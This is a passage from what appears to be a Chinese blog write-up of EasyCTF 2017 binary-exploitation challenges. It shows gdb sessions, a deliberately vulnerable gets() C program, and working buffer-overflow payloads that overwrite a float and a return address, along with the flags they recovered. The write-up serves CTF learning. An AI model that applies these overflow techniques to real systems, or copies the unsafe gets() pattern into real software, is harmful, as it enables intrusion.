   0x08048676 &lt;+111&gt;:    call   0x8048410 &lt;puts@plt&gt;
   0x0804867b &lt;+116&gt;:    add    esp,0x10
   0x0804867e &lt;+119&gt;:    mov    eax,0x0
   0x08048683 &lt;+124&gt;:    mov    ecx,DWORD PTR [ebp-0x4]
   0x08048686 &lt;+127&gt;:    leave  
   0x08048687 &lt;+128&gt;:    lea    esp,[ecx-0x4]
   0x0804868a &lt;+131&gt;:    ret    
End of assembler dump.
</code></pre><p>大致看了之后，看到其中的：</p><pre><code>0x0804863c &lt;+53&gt;:    fld    DWORD PTR [ebp-0xc]
0x0804863f &lt;+56&gt;:    fld    DWORD PTR ds:0x804876c
0x08048645 &lt;+62&gt;:    fucomip st,st(1)
</code></pre><p>根据题意就是溢出覆盖<code>ebp-0xc</code>的值使之和<code>0x804876c</code>所指的值相等。于是不断尝试输入查看<code>ebp-0xc</code>所指的值的变化，当输入64个A字符时没有覆盖：</p><pre><code>(gdb) set disassembly-flavor intel
(gdb) b main
Breakpoint 1 at 0x8048615
(gdb) r &lt; 64A.txt 
Starting program: /home/sunnyelf/Desktop/doubly_dangerous &lt; 64A.txt

Breakpoint 1, 0x08048615 in main ()
(gdb) x/wx $ebp-0xc
0xbffff0fc: 0x080486b1
</code></pre><p>当输入65个A字符时开始覆盖（A字符的ASCII码的十六进制是41）：</p><pre><code>(gdb) r &lt; 65A.txt 
Starting program: /home/sunnyelf/Desktop/doubly_dangerous &lt; 65A.txt

Breakpoint 1, 0x08048615 in main ()
(gdb) x/wx $ebp-0xc
0xbffff0fc:    0x08048641
</code></pre><p>接下再看一下<code>0x804876c</code>所指的值：</p><pre><code>(gdb) x/wx 0x804876c
0x804876c: 0x41348000
</code></pre><p>于是构造payload：<code>&#39;A&#39; * 64 + &#39;\x00\x80\x34\x41&#39;</code></p><pre><code>python -c &quot;print &apos;A&apos;*64 + &apos;\x00\x80\x34\x41&apos;&quot; | ./doubly_dangerous
Give me a string: 
Success! Here is your flag:
easyctf{bofs_and_floats_are_d0uble_tr0uble!}
</code></pre><h2 id="Simple-Rop"><a href="#Simple-Rop" class="headerlink" title="Simple Rop"></a>Simple Rop</h2><h3 id="problem-10"><a href="#problem-10" class="headerlink" title="problem"></a>problem</h3><p>On the shell there is a folder <code>/problems/simple-rop</code>.</p><p>Read <code>flag.txt</code></p><p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/simple-rop/simple-rop.c" target="_blank" rel="external">Source</a></p><p><a href="https://github.com/EasyCTF/easyctf-2017-problems/blob/master/simple-rop/simple-rop" target="_blank" rel="external">Binary</a></p><h3 id="solution-9"><a href="#solution-9" class="headerlink" title="solution"></a>solution</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// simple-rop.c</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_flag</span><span class="params">()</span></span>;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">what_did_you_say</span><span class="params">()</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">gid_t</span> gid = getegid();</div><div class="line">    setresgid(gid, gid, gid);</div><div class="line">    what_did_you_say();</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_flag</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    system(<span class="string">"cat flag.txt"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">what_did_you_say</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">    <span class="keyword">char</span> buff[<span class="number">64</span>];</div><div class="line">    gets(buff);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"You said: %s\n"</span>, buff);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>看了源码，很显然要让我们调用print_flag()函数，于是先gdb看一下print_flag()函数的地址：</p><pre><code>(gdb) disas print_flag
Dump of assembler code for function print_flag:
   0x0804851a &lt;+0&gt;:    push   %ebp
   0x0804851b &lt;+1&gt;:    mov    %esp,%ebp
   0x0804851d &lt;+3&gt;:    sub    $0x8,%esp
   0x08048520 &lt;+6&gt;:    sub    $0xc,%esp
   0x08048523 &lt;+9&gt;:    push   $0x80485e0
   0x08048528 &lt;+14&gt;:    call   0x80483a0 &lt;system@plt&gt;
   0x0804852d &lt;+19&gt;:    add    $0x10,%esp
   0x08048530 &lt;+22&gt;:    nop
   0x08048531 &lt;+23&gt;:    leave  
   0x08048532 &lt;+24&gt;:    ret    
End of assembler dump.
</code></pre><p>地址为：0x0804851a，缓存为64字符，所以写个shell脚本跑一下：</p><pre><code>#!/bin/bash  

for i in {64..80};  
do
    python -c &quot;print &apos;A&apos; * $i + &apos;\x1a\x85\x04\x08&apos;&quot; | ./simple-rop
done
</code></pre><p>当跑到<code>python -c &#39;print &quot;A&quot;*76+&quot;\x1a\x85\x04\x08&quot;&#39; | ./simple-rop</code>成功调用print_flag()函数：</p><pre><code>easyctf{r0p_7o_v1ct0ry}
</code></pre></div></article><div class="blog-post-comments"><div id="disqus_thread"><noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div></div></div><div id="footer-post-container"><div id="footer-post"><div id="nav-footer" style="display:none"><ul><li><a href="/">Home</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Link</a></li><li><a href="/archives/">Archives</a></li><li><a href="http://github.com/sunnyelf">Projects</a></li><li><a href="/search/">Search</a></li></ul></div><div id="toc-footer" style="display:none"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-Reverse-Engineering"><span class="toc-number">1.</span> <span class="toc-text">0x06 Reverse Engineering</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Hexable"><span class="toc-number">1.1.</span> <span class="toc-text">Hexable</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem"><span class="toc-number">1.1.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution"><span class="toc-number">1.1.2.</span> <span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phunky-Python-I"><span class="toc-number">1.2.</span> <span class="toc-text">Phunky Python I</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Useless-Python"><span class="toc-number">1.3.</span> <span class="toc-text">Useless Python</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem-2"><span class="toc-number">1.3.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution-2"><span class="toc-number">1.3.2.</span> <span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Phunky-Python-II"><span class="toc-number">1.4.</span> <span class="toc-text">Phunky Python II</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem-3"><span class="toc-number">1.4.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution-3"><span class="toc-number">1.4.2.</span> <span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lucky-Guess"><span class="toc-number">1.5.</span> <span class="toc-text">Lucky Guess</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem-4"><span class="toc-number">1.5.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution-4"><span class="toc-number">1.5.2.</span> <span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hex-QR"><span class="toc-number">1.6.</span> <span class="toc-text">Hex QR</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem-5"><span class="toc-number">1.6.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution-5"><span class="toc-number">1.6.2.</span> <span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#67k"><span class="toc-number">1.7.</span> <span class="toc-text">67k</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem-6"><span class="toc-number">1.7.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution-6"><span class="toc-number">1.7.2.</span> <span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Heaps-of-Knowledge"><span class="toc-number">1.8.</span> <span class="toc-text">Heaps of Knowledge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem-7"><span class="toc-number">1.8.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution-7"><span class="toc-number">1.8.2.</span> <span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Morphin"><span class="toc-number">1.9.</span> <span class="toc-text">Morphin</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-Binary-Exploitation"><span class="toc-number">2.</span> <span class="toc-text">0x07 Binary Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Risky-Business"><span class="toc-number">2.1.</span> <span class="toc-text">Risky Business</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem-8"><span class="toc-number">2.1.1.</span> <span class="toc-text">problem</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Doubly-Dangerous"><span class="toc-number">2.2.</span> <span class="toc-text">Doubly Dangerous</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem-9"><span class="toc-number">2.2.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution-8"><span class="toc-number">2.2.2.</span> <span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Simple-Rop"><span class="toc-number">2.3.</span> <span class="toc-text">Simple Rop</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#problem-10"><span class="toc-number">2.3.1.</span> <span class="toc-text">problem</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#solution-9"><span class="toc-number">2.3.2.</span> <span class="toc-text">solution</span></a></li></ol></li></ol></li></ol></div><div id="share-footer" style="display:none"><ul><li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://sunnyelf.github.io/2017/04/09/EasyCTF-2017-Reverse-Pwn-Write-Up/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="https://twitter.com/share?url=https://sunnyelf.github.io/2017/04/09/EasyCTF-2017-Reverse-Pwn-Write-Up/&text=EasyCTF 2017 Reverse Pwn Write Up"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://sunnyelf.github.io/2017/04/09/EasyCTF-2017-Reverse-Pwn-Write-Up/&title=EasyCTF 2017 Reverse Pwn Write Up"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sunnyelf.github.io/2017/04/09/EasyCTF-2017-Reverse-Pwn-Write-Up/&is_video=false&description=EasyCTF 2017 Reverse Pwn Write Up"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="mailto:?subject=EasyCTF 2017 Reverse Pwn Write Up&body=Check out this article: https://sunnyelf.github.io/2017/04/09/EasyCTF-2017-Reverse-Pwn-Write-Up/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="https://getpocket.com/save?url=https://sunnyelf.github.io/2017/04/09/EasyCTF-2017-Reverse-Pwn-Write-Up/&title=EasyCTF 2017 Reverse Pwn Write Up"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="http://reddit.com/submit?url=https://sunnyelf.github.io/2017/04/09/EasyCTF-2017-Reverse-Pwn-Write-Up/&title=EasyCTF 2017 Reverse Pwn Write Up"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://sunnyelf.github.io/2017/04/09/EasyCTF-2017-Reverse-Pwn-Write-Up/&title=EasyCTF 2017 Reverse Pwn Write Up"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="http://digg.com/submit?url=https://sunnyelf.github.io/2017/04/09/EasyCTF-2017-Reverse-Pwn-Write-Up/&title=EasyCTF 2017 Reverse Pwn Write Up"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li><li><a class="icon" href="http://www.tumblr.com/share/link?url=https://sunnyelf.github.io/2017/04/09/EasyCTF-2017-Reverse-Pwn-Write-Up/&name=EasyCTF 2017 Reverse Pwn Write Up&description=&lt;p&gt;作者:&lt;a href=&#34;https://www.zhihu.com/people/sunnyelf/&#34; target=&#34;_blank&#34; rel=&#34;external&#34;&gt;Jing Ling&lt;/a&gt;&lt;br&gt;博客:&lt;a href=&#34;https://www.hackfun.org&#34; target=&#34;_blank&#34; rel=&#34;external&#34;&gt;HackFun&lt;/a&gt;&lt;/p&gt;&lt;h1 id=&#34;0x06-Reverse-Engineering&#34;&gt;&lt;a href=&#34;#0x06-Reverse-Engineering&#34; class=&#34;headerlink&#34; title=&#34;0x06 Reverse Engineering&#34;&gt;&lt;/a&gt;0x06 Reverse Engineering&lt;/h1&gt;&lt;h2 id=&#34;Hexable&#34;&gt;&lt;a href=&#34;#Hexable&#34; class=&#34;headerlink&#34; title=&#34;Hexable&#34;&gt;&lt;/a&gt;Hexable&lt;/h2&gt;&lt;h3 id=&#34;problem&#34;&gt;&lt;a href=&#34;#problem&#34; class=&#34;headerlink&#34; title=&#34;problem&#34;&gt;&lt;/a&gt;problem&lt;/h3&gt;&lt;p&gt;I tried to hide a flag sneakily, can you find it? &lt;a href=&#34;https://github.com/EasyCTF/easyctf-2017-problems/raw/master/hexable-autogen/hexable&#34; target=&#34;_blank&#34; rel=&#34;external&#34;&gt;Download&lt;/a&gt;&lt;/p&gt;"><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li></ul></div><div id="actions-footer"><ul><li id="toc"><a class="icon" href="#" onclick='return $("#toc-footer").toggle(),!1'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li><li id="share"><a class="icon" href="#" onclick='return $("#share-footer").toggle(),!1'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li><li id="top" style="display:none"><a class="icon" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li><li id="menu"><a class="icon" href="#" onclick='return $("#nav-footer").toggle(),!1'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li></ul></div></div></div><footer id="footer"><div class="footer-left">Copyright &copy; 2017 Jing Ling</div><div class="footer-right"><nav><ul><li><a href="/">Home</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Link</a></li><li><a href="/archives/">Archives</a></li><li><a href="http://github.com/sunnyelf">Projects</a></li><li><a href="/search/">Search</a></li></ul></nav></div></footer></body></html><link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet"><link href="https://cdn.bootcss.com/justifiedGallery/3.6.1/css/justifiedGallery.min.css" rel="stylesheet"><script src="https://cdn.bootcss.com/jquery/2.1.3/jquery.min.js"></script><script src="https://cdn.bootcss.com/justifiedGallery/3.6.1/js/jquery.justifiedGallery.min.js"></script><script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/main.min.js"></script><script type="text/javascript">var disqus_shortname="sunnyelf";!function(){var e=document.createElement("script");e.type="text/javascript",e.async=!0,e.src="//"+disqus_shortname+".disqus.com/embed.js",(document.getElementsByTagName("head")[0]||document.getElementsByTagName("body")[0]).appendChild(e)}()</script>